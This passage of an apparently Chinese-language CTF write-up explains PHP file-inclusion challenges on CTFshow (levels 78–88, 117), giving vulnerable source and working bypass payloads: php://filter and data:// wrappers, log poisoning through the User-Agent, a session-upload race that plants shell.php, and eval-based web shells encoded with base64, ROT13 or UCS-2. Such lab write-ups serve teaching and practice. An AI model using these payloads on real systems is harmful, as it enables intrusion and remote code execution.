id=\"3-白盒利用-ctfshow-伪协议玩法\">3.白盒利用-ctfshow-伪协议玩法</h5>\n<ul>\n<li>白盒发现：\n<ul>\n<li>可通过应用功能追踪代码定位审计</li>\n<li>可通过脚本特定函数搜索定位审计</li>\n<li>可通过伪协议玩法绕过相关修复等</li>\n</ul>\n</li>\n<li>PHP：<code>include</code>、<code>include_once</code>、<code>require</code>、<code>require_once</code>\n<ul>\n<li><code>include</code> 在包含的过程中如果出现错误，会抛出一个警告，但程序继续执行</li>\n<li><code>require</code> 函数出现错误时，会直接报错并退出和终止程序</li>\n</ul>\n</li>\n<li>Java：<code>java.io.File</code>、<code>java.io.FileReader</code> 等</li>\n<li><a href=\"http://ASP.NET\">ASP.NET</a>：<code>System.IO.FileStream</code>、<code>System.IO.StreamReader</code> 等</li>\n</ul>\n<h4 id=\"五、CTFshow-演示\">五、CTFshow 演示</h4>\n<h5 id=\"1-CTFshow-78-http-伪协议\">1.CTFshow-78 http 伪协议</h5>\n<ul>\n<li>\n<p>这里就是直接把源代码给出来，然后让你分析绕过的：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]))&#123;  </span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];  </span><br><span class=\"line\">    <span class=\"keyword\">include</span>(<span class=\"variable\">$file</span>);  </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>那这里什么都没过滤，就想用什么用什么了，可以远程包含尝试一下，也可以本地包含利用伪协议执行 php 命令</p>\n</li>\n<li>\n<p>我们这里就本地包含解题吧，一般读取文件都使用 <code>php://filter</code> 的这个协议，因为我们一开始并不知道当前目录的绝对路径</p>\n</li>\n<li>\n<p>所以这里可以先执行一个命令看看当前文件夹有哪些文件：<code>php://input POST:&lt;?php system('ls');?&gt;</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250810105918803.png\" alt=\"image-20250810105918803\"></p>\n</li>\n<li>\n<p>然后看到了 <code>flag.php</code>，那我们就直接尝试读取就好了：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250810105949536.png\" alt=\"image-20250810105949536\"></p>\n</li>\n<li>\n<p>当然，这里也可以用 <code>php://filter/read=convert.base64-encode/resource=flag.php</code> 读取，然后 <code>base64</code> 解码即可：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250810110032248.png\" alt=\"image-20250810110032248\"></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250810110054609.png\" alt=\"image-20250810110054609\"></p>\n</li>\n</ul>\n<h5 id=\"2-CTFshow-79-data-伪协议\">2.CTFshow-79 data 伪协议</h5>\n<ul>\n<li>\n<p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]))&#123;  </span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];  </span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;php&quot;</span>, <span class=\"string\">&quot;???&quot;</span>, <span class=\"variable\">$file</span>);  </span><br><span class=\"line\">    <span class=\"keyword\">include</span>(<span class=\"variable\">$file</span>);  </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>这里将 <code>php</code> 过滤了，我们用不了 <code>php</code> 伪协议了，同时 <code>payload</code> 中也不能包含 <code>php</code> 字段，那就使用 <code>data</code> 伪协议进行读取和写入：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250810110312830.png\" alt=\"image-20250810110312830\"></p>\n</li>\n</ul>\n<h5 id=\"3-CTFshow-80、81-日志文件利用\">3.CTFshow-80、81 日志文件利用</h5>\n<ul>\n<li>\n<p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]))&#123;  </span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];  </span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;php&quot;</span>, <span class=\"string\">&quot;???&quot;</span>, <span class=\"variable\">$file</span>);  </span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;data&quot;</span>, <span class=\"string\">&quot;???&quot;</span>, <span class=\"variable\">$file</span>);  </span><br><span class=\"line\">    <span class=\"keyword\">include</span>(<span class=\"variable\">$file</span>);  </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>可以看到这题将 <code>php</code> 和 <code>data</code> 都禁用了，那上面的协议只用 <code>file</code> 可以用了（不考虑 <code>zip</code> 等）</p>\n</li>\n<li>\n<p>但是 <code>file</code> <strong>只能读取绝对路径</strong> 的文件，这里我并不知道 <code>flag.php</code> 的绝对路径，靠猜显然是不可能的</p>\n</li>\n<li>\n<p>这时候我们就需要用到一些特殊的文件，比如日志文件</p>\n</li>\n<li>\n<p>为什么呢？因为日志文件很可能会记录我们的访问信息，比如 <code>UA</code> 头、<code>IP</code>、<code>Cookie</code> 等等信息，如果它记录了，那我们是不是可以尝试将 php 代码写到这些地方，让他包含执行呢？</p>\n</li>\n<li>\n<p>而且日志文件的绝对路径一般是默认的，但是需要结合搭载的服务器来看：<a href=\"https://www.linuxcool.com/linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%97%A5%E5%BF%97%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%EF%BC%9A-var-log-%E3%80%81nginx%E3%80%81apache%E3%80%81mysql%E7%AD%89%E5%B8%B8%E8%A7%81\">Linux 服务器日志存储位置详解：/var/log/、Nginx、Apache、MySQL 等常见日志目录 – Linux 命令大全(手册)</a></p>\n</li>\n<li>\n<p>这里是 <code>Nginx</code>，所以我们尝试访问一下 <code>Linux</code> 下 <code>Nginx</code> 的默认日志路径：<a href=\"https://blog.csdn.net/weixin_43945983/article/details/138070113\">linux 查看 nginx 日志-CSDN 博客</a></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250810111322151.png\" alt=\"image-20250810111322151\"></p>\n</li>\n<li>\n<p>可以看到这里呢，是会记录我们的 <code>UA</code> 头信息的，那我们尝试将 <code>php</code> 代码放入 <code>UA</code> 头看它是否执行，直接抓包：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250810111349244.png\" alt=\"image-20250810111349244\"></p>\n</li>\n<li>\n<p>然后放包，看日志：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250810111424043.png\" alt=\"image-20250810111424043\"></p>\n</li>\n<li>\n<p>可以看到成功执行我们的 <code>php</code> 代码，然后我们继续读取 <code>fl0g.php</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250810111511273.png\" alt=\"image-20250810111511273\"></p>\n</li>\n<li>\n<p>成功获得 flag</p>\n</li>\n</ul>\n<h5 id=\"4-CTFshow-82-Session-条件竞争\">4.CTFshow-82 Session&amp;条件竞争</h5>\n<ul>\n<li>\n<p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]))&#123;  </span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];  </span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;php&quot;</span>, <span class=\"string\">&quot;???&quot;</span>, <span class=\"variable\">$file</span>);  </span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;data&quot;</span>, <span class=\"string\">&quot;???&quot;</span>, <span class=\"variable\">$file</span>);  </span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;:&quot;</span>, <span class=\"string\">&quot;???&quot;</span>, <span class=\"variable\">$file</span>);  </span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;.&quot;</span>, <span class=\"string\">&quot;???&quot;</span>, <span class=\"variable\">$file</span>);  </span><br><span class=\"line\">    <span class=\"keyword\">include</span>(<span class=\"variable\">$file</span>);  </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>现在过滤了 <code>php</code>、<code>data</code>、<code>:</code> 以及 <code>.</code>，所以能够使用的伪协议只有 <code>file</code>、<code>zip</code> 之类</p>\n</li>\n<li>\n<p>这题需要通过 <code>SESSION</code> 来实现文件上传，之后再包含利用</p>\n</li>\n<li>\n<p>造成利用的原因就是因为 <code>PHP</code> 中有一个 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 选项</p>\n</li>\n<li>\n<p>在了解该选项之前，我们需要知道两个东西：</p>\n<ul>\n<li>\n<p><code>Session</code> 存储位置：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250810112259288.png\" alt=\"image-20250810112259288\"></p>\n</li>\n<li>\n<p>与 <code>Session</code> 有关的几个 PHP 选项：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250810112400618.png\" alt=\"image-20250810112400618\"></p>\n</li>\n</ul>\n</li>\n<li>\n<p>然后，我们在了解一个 PHP 中的 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 选项，简单来说就是 <strong>可以通过这个选项让服务器保存我们自定义的 <code>SESSION</code> 会话文件</strong></p>\n</li>\n<li>\n<p>但是由于上述条件，保存的内容会被立刻清除，和我们文件上传时一样，它是先上传再清除的，所以存在一个时间间隙我们可以利用</p>\n</li>\n<li>\n<p>于是我们可以写这样一个 <code>html</code> 代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!doctype <span class=\"keyword\">html</span>&gt;</span>    </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span>    </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span>    </span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://xxx.ctf.show/&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;POST&quot;</span> <span class=\"attr\">enctype</span>=<span class=\"string\">&quot;multipart/form-data&quot;</span>&gt;</span>    </span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;&lt;?php system(&#x27;ls&#x27;);?&gt;&#x27;)?&gt;&quot;</span> /&gt;</span>    </span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;file&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;file&quot;</span> /&gt;</span>      </span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;submit&quot;</span> /&gt;</span>    </span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span>    </span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span>    </span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>这个代码就是去上传一个 <code>SESSION</code>，然后里面的内容就是当这个 <code>SESSION</code> 文件被访问时，就创建一个 <code>shell.php</code> 后门</p>\n</li>\n<li>\n<p>然后把他搭载到本地，抓包，自定义 <code>PHPSESSID</code>，然后放入 <code>Intruder</code> 模块不断放包：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250810113238360.png\" alt=\"image-20250810113238360\"></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250810113306121.png\" alt=\"image-20250810113306121\"></p>\n</li>\n<li>\n<p>这里弄好之后，我们进入 ctfshow 那里访问 <code>sess_lingaaa</code> 文件，这个路径一般是默认路径（上面提到过）：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250810113455489.png\" alt=\"image-20250810113455489\"></p>\n</li>\n<li>\n<p>看到空白页面，没有保存就说明成功创建了 <code>sess_lingaaa</code> 文件，但是这里内容是空的，说明内容被删除了</p>\n</li>\n<li>\n<p>所以我们要持续的访问，在他还没删除的时候访问到，这样就可以创造 shell.php 了，这里同样用 bp 进行持续访问</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250810113639089.png\" alt=\"image-20250810113639089\"></p>\n</li>\n<li>\n<p>最后访问 shell.php 即可，更详细的文章：<a href=\"https://blog.csdn.net/Myon5/article/details/140207360\">ctfshow-web 入门-文件包含（web82-web86）条件竞争实现 session 会话文件包含_ctfshow web82-CSDN 博客</a></p>\n</li>\n</ul>\n<h5 id=\"5-CTFshow-87-php-filter-write-加密编码\">5.CTFshow-87 php://filter/write&amp;加密编码</h5>\n<ul>\n<li>\n<p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]))&#123;  </span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];  </span><br><span class=\"line\">    <span class=\"variable\">$content</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;content&#x27;</span>];  </span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;php&quot;</span>, <span class=\"string\">&quot;???&quot;</span>, <span class=\"variable\">$file</span>);  </span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;data&quot;</span>, <span class=\"string\">&quot;???&quot;</span>, <span class=\"variable\">$file</span>);  </span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;:&quot;</span>, <span class=\"string\">&quot;???&quot;</span>, <span class=\"variable\">$file</span>);  </span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;.&quot;</span>, <span class=\"string\">&quot;???&quot;</span>, <span class=\"variable\">$file</span>);  </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"title function_ invoke__\">urldecode</span>(<span class=\"variable\">$file</span>), <span class=\"string\">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class=\"variable\">$content</span>);  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>过滤了很多东西，然后 <code>file</code> 也比较难用，基本读不了有后缀的文件，那日志包含不行，<code>Session</code> 应该可以，但是也难用</p>\n</li>\n<li>\n<p>我们注意到这里 <strong>有个 <code>file_put_contents()</code> 函数和 <code>urldecode($file)</code> 函数</strong></p>\n</li>\n<li>\n<p>出现这两个函数我们就要注意了，第一个函数我们就可以使用 <code>php://filter/write</code> 去写入内容，第二个函数我们可以去绕过禁止 <code>php</code> 字段出现</p>\n</li>\n<li>\n<p>我们知道如果我们 GET 传入的参数值是经过 <code>URL</code> 编码的，那么浏览器就会帮我们自动解码一次</p>\n</li>\n<li>\n<p>但是第二个函数的出现，就会让服务器再帮我们解码一次，因此我们本地可以传入两次 URL 编码的 <code>payload</code>，这样浏览器解码后还是 URL 编码的值，绕过黑名单检测，服务器再解码一次就是我们真正写入的值了</p>\n</li>\n<li>\n<p>同时，我们也需要注意这里 <strong>有个 <code>die()</code> 函数需要绕过</strong>，不然我们就没法执行传入的 <code>content</code></p>\n</li>\n<li>\n<p>所以我们的 <code>payload</code> 为 <code>php://filter/write=convert.base64-decode/resource=1.php</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250810115730989.png\" alt=\"image-20250810115730989\"></p>\n</li>\n<li>\n<p>然后 <code>POST</code> 传入 <code>content</code>，这里需要将 <code>php</code> 语句进行 <code>base64</code> 编码，需要注意的是：</p>\n<ul>\n<li><strong>编码后的字节数要符合要求</strong>，否则会报错：</li>\n<li><strong>编码中不能出现 <code>+</code> 号</strong>，否则上传成功也无法执行</li>\n</ul>\n</li>\n<li>\n<p>那我们 <code>content</code> 内容就为：<code>&lt;?php @eval($_POST[a]);?&gt;</code>，然后 <code>Base64</code> 编码：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250810115837512.png\" alt=\"image-20250810115837512\"></p>\n</li>\n<li>\n<p>前面加上两个 a 是为了凑够字节数，然后访问 <code>1.php</code>，传入 <code>a=system('ls');</code>：</p>\n</li>\n<li>\n<p>base64可以绕过die函数。因为base64编码范围是 0 ～ 9,a ～ z,A ～ Z,+,/ ，所以除了这些字符，其他字符都会被忽略掉。</p>\n<p>base64过滤之后就只有(phpdie)6个字符了，base64要求把每三个8Bit的字节转换为四个6Bit的字节，所以这里也要凑够四个字节的倍数，避免base64解码出问题，这里加上两个字符即可。</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250810115920332.png\" alt=\"image-20250810115920332\"></p>\n</li>\n<li>\n<p>接下来就可以看 <code>flag</code> 了：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250810115947151.png\" alt=\"image-20250810115947151\"></p>\n</li>\n<li>\n<p>除了上述的使用 <code>Base64</code> 进行编码以外，还可以使用 <code>ROT13</code> 进行加密传输</p>\n</li>\n<li>\n<p><code>payload</code> 为 <code>php://filter/write=string.rot13/resource=2.php</code> 两次 URL 编码，<code>content</code> 的值为 <code>ROT13</code> 编码后的一句话木马</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250810120027931.png\" alt=\"image-20250810120027931\"></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250810120047048.png\" alt=\"image-20250810120047048\"></p>\n</li>\n</ul>\n<h5 id=\"6-CTFshow-88\">6.CTFshow-88</h5>\n<ul>\n<li>\n<p>源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]))&#123;  </span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];  </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i&quot;</span>, <span class=\"variable\">$file</span>))&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;error&quot;</span>);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    <span class=\"keyword\">include</span>(<span class=\"variable\">$file</span>);  </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>这里过滤了 <code>php</code> 以及一堆符号，但是没过滤 <code>data</code>，所以尝试用 <code>data</code> 伪协议去执行代码</p>\n</li>\n<li>\n<p>尝试使用 <code>payload</code> 为：<code>data://text,plaintext;base64,PD9waHAgc3lzdGVtKCdscycpOz8+</code>，这是不行的，因为里面包含了字符 <code>+</code>，会被过滤</p>\n</li>\n<li>\n<p>所以这里 <code>base64</code> 编码的值不能包含符号，那就在左右添加值来生成一个没有符号的 <code>base64</code> 编码</p>\n</li>\n<li>\n<p>最终我们生成的 payload 为 data://text/plain; base64, YWE8P3BocCBzeXN0ZW0oJ2xzJyk7Pz4xMjM0NTU，即 aa <?php system('ls');?> 123455 和 12 <?php system('tac *php');?> 成功绕过</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250810124040372.png\" alt=\"image-20250810124040372\"></p>\n</li>\n</ul>\n<h5 id=\"7-CTFshow-117-php-filter-write-新的算法\">7.CTFshow-117 php://filter/write&amp;新的算法</h5>\n<ul>\n<li>\n<p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);  </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span>(<span class=\"params\"><span class=\"variable\">$x</span></span>)</span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class=\"variable\">$x</span>))&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;too young too simple sometimes naive!&#x27;</span>);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"variable\">$file</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];  </span><br><span class=\"line\"><span class=\"variable\">$contents</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;contents&#x27;</span>];  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">filter</span>(<span class=\"variable\">$file</span>);  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"variable\">$file</span>, <span class=\"string\">&quot;&lt;?php die();?&gt;&quot;</span>.<span class=\"variable\">$contents</span>);</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>这关过滤了很多东西，甚至连 <code>base64</code> 和 <code>rot13</code> 都过滤了，而且还有个 <code>die()</code> 函数需要绕过，那基本上只能加密这些了，但是没过滤 <code>php</code>，所以可以使用 <code>php</code> 伪协议</p>\n</li>\n<li>\n<p>我们还有一种 <code>php</code> 伪协议的过滤器 <code>convert.iconv.*</code>，详见：<a href=\"https://blog.csdn.net/qq_44657899/article/details/109300335\">php://filter 的各种过滤器_php 过滤器转换器常见-CSDN 博客</a></p>\n</li>\n<li>\n<p>这里可以把 <code>content</code> 的内容从 <code>UCS-2LE</code> 编码转换为 <code>UCS-2BE</code> 编码，绕过过滤和 <code>die()</code> 函数</p>\n</li>\n<li>\n<p>写一个脚本将 <code>contents</code> 的内容转一下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">iconv</span>(<span class=\"string\">&quot;UCS-2LE&quot;</span>,<span class=\"string\">&quot;UCS-2BE&quot;</span>, <span class=\"string\">&#x27;$contents&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$result</span>;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>所以 <code>payload</code> 为：<code>php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=1.php</code>，<code>contents=?&lt;hp pvela$(P_SO[T]a;)&gt;?</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250810125111666.png\" alt=\"image-20250810125111666\"></p>\n</li>\n<li>\n<p>成功执行，然后直接看 <code>flag</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250810125138387.png\" 